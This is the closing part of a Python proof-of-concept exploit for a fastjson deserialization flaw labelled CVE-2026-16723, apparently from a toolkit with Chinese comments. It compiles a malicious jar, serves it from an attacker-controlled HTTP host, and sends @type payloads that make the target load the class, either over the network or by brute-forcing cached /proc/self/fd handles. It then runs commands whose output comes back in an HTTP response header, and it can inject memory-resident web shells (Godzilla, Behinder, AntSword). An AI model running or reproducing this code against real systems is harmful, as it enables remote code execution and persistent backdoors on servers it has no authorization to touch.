        if fd_min <= fd <= fd_max and fd in fd_types and fd not in seen:
            ordered.append(fd)
            seen.add(fd)
    for fd in range(fd_max, fd_min - 1, -1):
        if fd in fd_types and fd not in seen:
            ordered.append(fd)
            seen.add(fd)
    return ordered


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="CVE-2026-16723 PoC — jar:http 出网 / fd 缓存不出网 / 内存马",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=HELP_EPILOG,
    )
    p.add_argument(
        "-u",
        "--url",
        default=DEFAULT_TARGET,
        help=f"目标地址 (default: {DEFAULT_TARGET})",
    )
    p.add_argument(
        "--json-path",
        default=DEFAULT_JSON_PATH,
        help=f"反序列化路径 (default: {DEFAULT_JSON_PATH})",
    )
    p.add_argument(
        "--docker-container",
        default=DEFAULT_DOCKER_CONTAINER,
        help=f"读证明文件用的 docker 容器名；空字符串禁用 (default: {DEFAULT_DOCKER_CONTAINER})",
    )
    p.add_argument(
        "-m",
        "--mode",
        choices=sorted(EXPLOIT_MODE_MAP),
        default="http",
        help="http=出网直接打; fd=缓存后 /proc/self/fd 不出网 (default: http)",
    )
    p.add_argument(
        "-H",
        "--host",
        default="attacker",
        help="攻击者 HTTP 主机，靶场视角；IPv4 自动转十进制 (default: attacker)",
    )
    p.add_argument(
        "-P",
        "--port",
        type=int,
        default=9192,
        help="攻击者 HTTP 端口 (default: 9192)",
    )
    p.add_argument(
        "-c",
        "--cmd",
        default="id",
        help="要执行的命令；内存马模式下用于注入后验证 (default: id)",
    )
    p.add_argument(
        "-e",
        "--echo",
        action="store_true",
        help="回显模式（命令走请求头 X-Cmd，结果在响应体/X-Echo）",
    )
    p.add_argument(
        "--engine",
        choices=list(ECHO_ENGINES),
        default="auto",
        help="回显引擎: auto/spring/undertow/tomcat (default: auto)",
    )
    p.add_argument(
        "--memshell",
        action="store_true",
        help="注入内存马（内置 memshell-gen.jar / 可选 MemShellParty HTTP）",
    )
    p.add_argument(
        "--ms-api",
        default=DEFAULT_MSHELL_API,
        help="内存马后端：jar（默认，内置生成器）或 http(s)://MemShellParty",
    )
    p.add_argument(
        "--ms-server",
        default="Undertow",
        choices=list(MSHELL_SERVERS),
        help="内存马中间件 (default: Undertow)",
    )
    p.add_argument(
        "--ms-tool",
        default="Command",
        choices=list(MSHELL_TOOLS),
        help="内存马工具类型 (default: Command)",
    )
    p.add_argument(
        "--ms-type",
        default="Filter",
        help="内存马组件类型，如 Filter/Listener/Servlet (default: Filter)",
    )
    p.add_argument(
        "--ms-path",
        default="/*",
        help="urlPattern，Filter/Servlet 用 (default: /*)",
    )
    p.add_argument(
        "--ms-jdk",
        default="8",
        choices=sorted(MSHELL_JDK_MAP, key=lambda x: int(x)),
        help="目标 JDK 大版本；>=9 自动 byPassJavaModule (default: 8)",
    )
    p.add_argument(
        "-t",
        "--type",
        default="",
        help="复用已命中的 @type，跳过缓存/爆破",
    )
    return p.parse_args(argv)


def normalize_type_arg(raw: str | None) -> str | None:
    """规范化 -t/@type：去掉首尾空白与包裹引号（Windows cmd 会把单引号当字面量）。"""
    if raw is None:
        return None
    s = raw.strip()
    if not s:
        return None
    # 反复剥掉成对引号：'...' / "..." / `'...'`
    while len(s) >= 2 and s[0] == s[-1] and s[0] in "'\"":
        s = s[1:-1].strip()
    return s or None


def format_reuse_cmd(target: str, type_name: str, *, echo: bool = True, cmd: str = "whoami") -> str:
    """生成可直接复制的复用命令（Windows/Linux 均用双引号包裹 @type）。"""
    # 双引号内的 type 若含 " 极少见；fd/jarhttp type 不含双引号
    t = type_name.replace('"', '\\"')
    parts = [f"fjtoolkit poc-16723 -u {target}"]
    if echo:
        parts.append("-e")
    parts.append(f"-c {cmd}")
    parts.append(f'-t "{t}"')
    return " ".join(parts)


def stage2_headers(echo: bool, cmd_header: str, cmd: str | None) -> dict[str, str] | None:
    if not echo:
        return None
    return {cmd_header: cmd or "id"}


def is_hit(
    echo: bool,
    body: str,
    resp_headers: dict[str, str],
    proof: str | None,
    memshell: bool = False,
) -> tuple[bool, str | None]:
    """返回 (是否命中, echo 明文)。tomcat-prime / memshell-error 不算最终成功。"""
    echo_text = decode_echo_header(resp_headers)
    if echo and echo_text is not None:
        return True, echo_text
    if proof and PROOF_MARKER in proof:
        if "mode=tomcat-prime" in proof or "mode=memshell-error" in proof:
            return False, echo_text
        if memshell:
            return "mode=memshell" in proof, echo_text
        return True, echo_text
    if echo and body and body != "success" and "Internal Server Error" not in body:
        if resp_headers.get("X-Echo-Cmd") or resp_headers.get("x-echo-cmd"):
            return True, body
    return False, echo_text


def looks_like_cmd_output(text: str) -> bool:
    t = (text or "").strip()
    if not t or t == "success":
        return False
    if "Internal Server Error" in t or t.startswith("HTTP Error"):
        return False
    # 常见命令输出特征
    markers = ("uid=", "gid=", "groups=", "root", "Windows", "USERDOMAIN", "\n")
    return any(m in t for m in markers) or (len(t) < 400 and " " in t)


def verify_memshell_injected(
    target: str,
    memshell: dict[str, Any],
    cmd: str,
    json_path: str = DEFAULT_JSON_PATH,
) -> tuple[bool, str]:
    """注入后探测；Command 可直接验证，其它工具只提示连接信息。"""
    tool = memshell.get("tool") or ""
    if tool == "Command":
        code, body = probe_command_memshell(
            target,
            param_name=memshell.get("param_name") or "cmd",
            cmd=cmd,
            url_pattern=memshell.get("url_pattern") or "/*",
            json_path=json_path,
        )
        ok = code == 200 and looks_like_cmd_output(body)
        detail = (
            f"HTTP {code}\n{body}\n---\n"
            + format_memshell_connect_info(memshell, target)
        )
        return ok, detail
    # 非 Command：以 proof mode=memshell 为准，这里返回随机化后的连接信息
    return True, format_memshell_connect_info(memshell, target)


def post_echo_json(
    target: str,
    type_name: str,
    timeout: float,
    extra_headers: dict[str, str] | None,
    echo_engine: str,
    docker_container: str,
    proof_path: str,
    json_path: str = DEFAULT_JSON_PATH,
) -> tuple[int, str, dict[str, str]]:
    """发送 echo payload；Tomcat WRAP_SAME_OBJECT 需要第二次请求才有 request/response。"""
    payload = {"@type": type_name}
    code, body, headers = post_json(
        target,
        payload,
        timeout=timeout,
        extra_headers=extra_headers,
        json_path=json_path,
    )
    if decode_echo_header(headers) is not None:
        return code, body, headers

    proof = docker_read_proof(docker_container, proof_path)
    primed = bool(proof and "mode=tomcat-prime" in proof)
    # tomcat 引擎：每个候选都补一枪；auto 仅在检测到 priming 后补一枪
    if echo_engine == "tomcat" or primed:
        code, body, headers = post_json(
            target,
            payload,
            timeout=timeout,
            extra_headers=extra_headers,
            json_path=json_path,
        )
    return code, body, headers


def run_jarhttp_exploit(
    *,
    target: str,
    jar_path: Path,
    jar_name: str,
    http_type: str,
    payload_host: str,
    http_port: int,
    echo: bool,
    echo_engine: str,
    cmd: str | None,
    cmd_header: str,
    docker_container: str,
    proof_path: str,
    req_timeout: float,
    memshell: dict[str, Any] | None = None,
    json_path: str = DEFAULT_JSON_PATH,
) -> int:
    """jar:http 出网直接利用：保持 HTTP 服务，一次加载恶意类。"""
    server = start_http_server(jar_path, jar_name, "0.0.0.0", http_port)
    try:
        time.sleep(0.3)
        restored = http_type.replace(".", "/")
        log(f"[*] jarhttp type : {http_type}")
        log(f"[*] restored URL : {restored}.class")
        log(f"[*] fetch URL    : http://{payload_host}:{http_port}/{jar_name}")
        headers = stage2_headers(echo, cmd_header, cmd)
        if echo:
            code, body, resp_headers = post_echo_json(
                target,
                http_type,
                max(req_timeout, 15.0),
                headers,
                echo_engine,
                docker_container,
                proof_path,
                json_path=json_path,
            )
        else:
            code, body, resp_headers = post_json(
                target,
                {"@type": http_type},
                timeout=max(req_timeout, 15.0),
                extra_headers=headers,
                json_path=json_path,
            )
        proof = docker_read_proof(docker_container, proof_path)
        hit, echo_text = is_hit(echo, body, resp_headers, proof, memshell=bool(memshell))
        eng = resp_headers.get(ECHO_ENGINE_HEADER) or resp_headers.get(ECHO_ENGINE_HEADER.lower())
        log(f"[*] response: HTTP {code} body={body!r} engine={eng!r} hits={CountingHandler.hits}")
        if echo_text is not None:
            log(f"[+] echo output:\n{_c(echo_text, _Ansi.BRIGHT_GREEN)}")
        if proof:
            log(f"[+] proof file:\n{_c(proof, _Ansi.DIM, _Ansi.GREEN)}")
        if CountingHandler.hits < 1:
            log_err(
                "[!] 恶意 HTTP 未被访问（靶场未拉取攻击者 jar）\n"
                f"    靶场      : {target}\n"
                f"    攻击者jar : http://{payload_host}:{http_port}/{jar_name}\n"
                "    提示: Docker 靶场请用 -H attacker（或宿主机可达 IP），"
                "不要用 127.0.0.1（容器内指向自身）"
            )
            return 1
        if memshell:
            ok, detail = verify_memshell_injected(
                target, memshell, cmd or "id", json_path=json_path
            )
            log(f"[*] memshell probe:\n{detail}")
            if not (hit or ok):
                log_err("[!] jarhttp 内存马注入未确认（无 proof 且探测失败）")
                return 1
            if not ok and memshell.get("tool") == "Command":
                log_err("[!] 内存马注入后 Command 探测失败（injector 可能已加载但未挂上）")
                return 1
            log(f"[+] SUCCESS: memshell injected via jarhttp (type={hl(http_type)})")
            return 0
        if not hit:
            log_err("[!] jarhttp 利用未观察到回显/证明文件")
            return 1
        log(f"[+] SUCCESS: jarhttp outbound exploit ok (type={hl(http_type)})")
        if echo:
            log(
                f"[*] reuse:\n  {format_reuse_cmd(target, http_type)}"
            )
        return 0
    finally:
        try:
            server.shutdown()
            server.server_close()
        except Exception:
            pass


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)

    # 固定默认值（不再暴露为 CLI，保持实战参数精简）
    http_bind = "0.0.0.0"
    http_host_encode = "auto"
    fd_min, fd_max = 1, 256
    req_timeout = 2.0
    proof_path = "/tmp/cve-2026-16723-pwned"
    cmd_header = "X-Cmd"
    docker_container = (args.docker_container or "").strip()
    json_path = args.json_path or DEFAULT_JSON_PATH
    fastjson = DEFAULT_FASTJSON
    servlet_api = DEFAULT_SERVLET_API

    if not fastjson.is_file():
        log_err(f"[!] 找不到 fastjson: {fastjson}")
        return 2

    try:
        payload_host, host_note = resolve_payload_http_host(args.host, http_host_encode)
    except ValueError as e:
        log_err(f"[!] {e}")
        return 2

    target = args.url
    cmd = (args.cmd or "").strip() or "id"
    reuse_type = normalize_type_arg(args.type)
    if args.type and not reuse_type:
        log_err("[!] -t/--type 为空或仅含引号")
        return 2
    if args.type and reuse_type != args.type.strip():
        log(f"[*] stripped quotes from -t -> {hl(reuse_type)}")
    use_memshell = bool(args.memshell)
    echo = bool(args.echo) and not use_memshell
    if args.echo and use_memshell:
        log("[!] --memshell 与 -e 互斥，已优先内存马模式")
    echo_engine = args.engine if echo else "auto"
    exploit_mode = EXPLOIT_MODE_MAP[args.mode]
    nonce = secrets.token_hex(2)
    jar_name = f"EvilJar{nonce}"

    # 纯复用 @type：不编 jar、不占端口
    if reuse_type:
        log(f"[*] target   : {hl(target)}")
        log(f"[*] reuse type: {hl(reuse_type)}")
        if echo:
            log(f"[*] echo     : engine={hl(echo_engine)}, header={hl(cmd_header)}")
            log(f"[*] cmd      : {hl(cmd)}")
        elif use_memshell:
            log_err("[!] -t 复用模式不支持重新生成内存马，请去掉 --memshell")
            return 2
        else:
            log(f"[*] cmd      : {hl(cmd)} (reuse 时 echo 关闭则仅触发类加载)")
        if docker_container:
            docker_rm_proof(docker_container, proof_path)
        headers = stage2_headers(echo, cmd_header, cmd)
        if echo:
            code, body, resp_headers = post_echo_json(
                target,
                reuse_type,
                max(req_timeout, 8.0),
                headers,
                echo_engine,
                docker_container,
                proof_path,
                json_path=json_path,
            )
        else:
            code, body, resp_headers = post_json(
                target,
                {"@type": reuse_type},
                timeout=max(req_timeout, 8.0),
                extra_headers=headers,
                json_path=json_path,
            )
        proof = docker_read_proof(docker_container, proof_path)
        hit, echo_text = is_hit(echo, body, resp_headers, proof, memshell=False)
        eng = resp_headers.get(ECHO_ENGINE_HEADER) or resp_headers.get(ECHO_ENGINE_HEADER.lower())
        log(f"[*] response: HTTP {code} body={body!r} engine={eng!r}")
        if echo_text is not None:
            log(f"[+] echo output:\n{_c(echo_text, _Ansi.BRIGHT_GREEN)}")
        if proof:
            log(f"[+] proof file:\n{_c(proof, _Ansi.DIM, _Ansi.GREEN)}")
        if not hit:
            log_err(
                "[!] reuse-type 请求未观察到回显/证明文件\n"
                "    提示: Windows 请用双引号 -t \"jar:file:...\"，不要用单引号"
            )
            return 1
        log("[+] SUCCESS: reuse ok")
        return 0

    # 其它模式启动前先检测端口
    try:
        ensure_port_free(http_bind, args.port)
        log(f"[+] port ok  : {hl(f'{http_bind}:{args.port}')}")
    except RuntimeError as e:
        log_err(f"[!] {e}")
        return 2

    memshell_info: dict[str, Any] | None = None
    if use_memshell:
        ms_auth = randomize_memshell_auth(args.ms_tool)
        try:
            ms_jdk, ms_class_ver, ms_bypass = resolve_memshell_jdk(args.ms_jdk)
        except ValueError as e:
            log_err(f"[!] {e}")
            return 2
        try:
            log(
                f"[*] memshell : backend={args.ms_api} "
                f"{hl(args.ms_server)}/{hl(args.ms_tool)}/{hl(args.ms_type)} "
                f"path={hl(args.ms_path)}"
            )
            log(
                f"[*] ms jdk   : {hl('Java' + ms_jdk)} "
                f"(classVer={ms_class_ver}, byPassJavaModule={hl(str(ms_bypass))})"
            )
            log(
                f"[*] ms auth  : header={hl(ms_auth['header_name'])}: {hl(ms_auth['header_value'])}"
                + (
                    f" pass={hl(ms_auth['behinder_pass'])}"
                    if args.ms_tool == "Behinder"
                    else ""
                )
                + (
                    f" pass={hl(ms_auth['godzilla_pass'])} key={hl(ms_auth['godzilla_key'])}"
                    if args.ms_tool == "Godzilla"
                    else ""
                )
                + (
                    f" pass={hl(ms_auth['antsword_pass'])}"
                    if args.ms_tool == "AntSword"
                    else ""
                )
                + (
                    f" param={hl(ms_auth['param_name'])}"
                    if args.ms_tool == "Command"
                    else ""
                )
            )
            result = memshell_generate(
                args.ms_api,
                server=args.ms_server,
                tool=args.ms_tool,
                shell_type=args.ms_type,
                url_pattern=args.ms_path,
                param_name=ms_auth["param_name"],
                header_name=ms_auth["header_name"],
                header_value=ms_auth["header_value"],
                godzilla_pass=ms_auth["godzilla_pass"],
                godzilla_key=ms_auth["godzilla_key"],
                behinder_pass=ms_auth["behinder_pass"],
                antsword_pass=ms_auth["antsword_pass"],
                target_jre=ms_class_ver,
                by_pass_java_module=ms_bypass,
            )
        except RuntimeError as e:
            log_err(f"[!] {e}")
            return 2
        tool_cfg = result.get("shellToolConfig") or {}
        # API 回显字段因工具而异；随机值始终作为兜底，保证可复现连接信息
        api_pass = tool_cfg.get("pass") or tool_cfg.get("behinderPass") or tool_cfg.get(
            "antSwordPass"
        )
        api_key = tool_cfg.get("key") or tool_cfg.get("godzillaKey")
        memshell_info = {
            "injector_b64": result["injectorBytesBase64Str"],
            "injector_class": result.get("injectorClassName") or "",
            "shell_class": result.get("shellClassName") or "",
            "server": args.ms_server,
            "tool": args.ms_tool,
            "shell_type": args.ms_type,
            "url_pattern": args.ms_path,
            "param_name": tool_cfg.get("paramName") or ms_auth["param_name"],
            "header_name": tool_cfg.get("headerName") or ms_auth["header_name"],
            "header_value": tool_cfg.get("headerValue") or ms_auth["header_value"],
            "godzilla_pass": (
                tool_cfg.get("pass") or tool_cfg.get("godzillaPass") or ms_auth["godzilla_pass"]
            ),
            "godzilla_key": api_key or ms_auth["godzilla_key"],
            "behinder_pass": api_pass or ms_auth["behinder_pass"],
            "antsword_pass": api_pass or ms_auth["antsword_pass"],
        }
        log(
            f"[+] memshell generated: injector={hl(memshell_info['injector_class'])} "
            f"({result.get('injectorSize')} bytes) shell={hl(memshell_info['shell_class'])} "
            f"({result.get('shellSize')} bytes)"
        )

    work = Path(tempfile.mkdtemp(prefix="cve-2026-16723-fd-"))
    server = None
    try:
        log(f"[*] target   : {hl(target)}")
        log(f"[*] mode     : {hl(args.mode)} ({exploit_mode})")
        log(f"[*] http     : {hl(f'{payload_host}:{args.port}/{jar_name}')} ({host_note})")
        if args.host != payload_host:
            log(f"[*] host in  : {hl(args.host)}")
        if use_memshell:
            log(f"[*] payload  : memshell ({hl(args.ms_tool)}/{hl(args.ms_type)})")
            log(f"[*] verify   : {hl(cmd)}")
        elif echo:
            log(f"[*] echo     : engine={hl(echo_engine)}, header={hl(cmd_header)}")
            log(f"[*] cmd      : {hl(cmd)}")
        else:
            log(f"[*] cmd      : {hl(cmd)} (baked)")

        classpath = resolve_compile_classpath(fastjson, echo, servlet_api)
        jar_path, http_type, fd_types = build_evil_jar(
            work=work,
            classpath=classpath,
            http_host=payload_host,
            http_port=args.port,
            jar_name=jar_name,
            fd_min=fd_min,
            fd_max=fd_max,
            proof_path=proof_path,
            cmd=cmd,
            echo=echo,
            cmd_header=cmd_header,
            echo_engine=echo_engine,
            nonce=nonce,
            mode=exploit_mode,
            memshell=memshell_info,
        )
        nclass = 1 if exploit_mode == "jarhttp" else len(fd_types) + 1
        log(f"[+] evil jar : {jar_path.name} ({jar_path.stat().st_size} bytes, {nclass} classes)")

        if docker_container:
            docker_rm_proof(docker_container, proof_path)

        # jar:http 出网直接利用
        if exploit_mode == "jarhttp":
            return run_jarhttp_exploit(
                target=target,
                jar_path=jar_path,
                jar_name=jar_name,
                http_type=http_type,
                payload_host=payload_host,
                http_port=args.port,
                echo=echo,
                echo_engine=echo_engine,
                cmd=cmd,
                cmd_header=cmd_header,
                docker_container=docker_container,
                proof_path=proof_path,
                req_timeout=req_timeout,
                memshell=memshell_info,
                json_path=json_path,
            )

        # fd-cache 两阶段
        preferred_fds: list[int] = []
        hits_after_stage1 = 0
        server = start_http_server(jar_path, jar_name, http_bind, args.port)
        time.sleep(0.3)
        log(f"[*] stage1 jar:http cache -> {http_type}")
        code, body, _ = post_json(
            target, {"@type": http_type}, timeout=15.0, json_path=json_path
        )
        log(f"[*] stage1 response: HTTP {code} body={body!r} hits={CountingHandler.hits}")
        if CountingHandler.hits < 1:
            log_err(
                "[!] 恶意 HTTP 未被访问（靶场未拉取攻击者 jar）\n"
                f"    靶场      : {target}\n"
                f"    攻击者jar : http://{payload_host}:{args.port}/{jar_name}\n"
                "    提示: Docker 靶场请用 -H attacker（或宿主机可达 IP），"
                "不要用 127.0.0.1（容器内指向自身）"
            )
            return 1

        fd_info = docker_list_jar_fd_info(docker_container)
        if fd_info:
            log("[*] candidate cached fds after stage1:")
            for fd, ln in fd_info:
                log(f"    fd={fd} {ln}")
            preferred_fds = list(reversed([fd for fd, _ in fd_info]))

        server.shutdown()
        server.server_close()
        server = None
        hits_after_stage1 = CountingHandler.hits
        log(f"[+] HTTP stopped (hits={hits_after_stage1}). stage2 offline.")

        ordered = order_fd_candidates(fd_types, preferred_fds, fd_min, fd_max)
        log(f"[*] stage2 brute fd x{len(ordered)}")
        if preferred_fds:
            log(f"[*] prefer fds: {preferred_fds[:8]}{'...' if len(preferred_fds) > 8 else ''}")

        success_fd = None
        success_type = None
        success_echo = None
        success_engine = None
        s2_headers = stage2_headers(echo, cmd_header, cmd)

        for idx, fd in enumerate(ordered, 1):
            type_name = fd_types[fd]
            if echo:
                code, body, resp_headers = post_echo_json(
                    target,
                    type_name,
                    req_timeout,
                    s2_headers,
                    echo_engine,
                    docker_container,
                    proof_path,
                    json_path=json_path,
                )
            else:
                code, body, resp_headers = post_json(
                    target,
                    {"@type": type_name},
                    timeout=max(req_timeout, 8.0) if use_memshell else req_timeout,
                    extra_headers=s2_headers,
                    json_path=json_path,
                )
            proof = docker_read_proof(docker_container, proof_path)
            hit, echo_text = is_hit(
                echo, body, resp_headers, proof, memshell=bool(memshell_info)
            )
            # Command 内存马：即使 proof 读不到，探测通也算命中
            if not hit and memshell_info and memshell_info.get("tool") == "Command":
                ok, _detail = verify_memshell_injected(
                    target, memshell_info, cmd, json_path=json_path
                )
                if ok:
                    hit = True
            if hit:
                success_fd = fd
                success_type = type_name
                success_echo = echo_text
                success_engine = resp_headers.get(ECHO_ENGINE_HEADER) or resp_headers.get(
                    ECHO_ENGINE_HEADER.lower()
                )
                log(
                    f"[+] HIT fd={hl(str(fd))} HTTP {code} body={body!r} "
                    f"engine={hl(str(success_engine))}"
                )
                if echo_text is not None:
                    log(f"[+] echo output:\n{_c(echo_text, _Ansi.BRIGHT_GREEN)}")
                if proof:
                    log(f"[+] proof file:\n{_c(proof, _Ansi.DIM, _Ansi.GREEN)}")
                break
            if fd in preferred_fds or idx <= 3 or idx % 32 == 0:
                log(f"[-] try fd={fd} HTTP {code} body={body!r}")

        hits_stage2 = CountingHandler.hits - hits_after_stage1
        log(f"[*] HTTP hits during stage2: {hits_stage2} (expect 0)")

        if success_fd is None:
            log_err("[!] fd brute failed")
            return 1
        if hits_stage2 != 0:
            log_err("[!] stage2 仍有 HTTP 访问，不出网证明不完整")
            return 1

        if memshell_info:
            ok, detail = verify_memshell_injected(
                target, memshell_info, cmd, json_path=json_path
            )
            log(f"[*] memshell probe:\n{detail}")
            if not ok:
                log_err("[!] 内存马注入后探测失败")
                return 1
            log(
                f"[+] SUCCESS: memshell via fd-cache "
                f"(fd={hl(str(success_fd))}, type={hl(str(success_type))})"
            )
            return 0

        log(
            f"[+] SUCCESS: fd-cache ok "
            f"(fd={hl(str(success_fd))}, type={hl(str(success_type))})"
        )
        if echo and success_type:
            log(
                f"[*] reuse:\n  {format_reuse_cmd(target, success_type)}"
            )
            if success_echo is None:
                log("[*] tip: 无 X-Echo 时可加 --engine undertow/tomcat")
        return 0
    finally:
        if server is not None:
            try:
                server.shutdown()
                server.server_close()
            except Exception:
                pass
        shutil.rmtree(work, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())
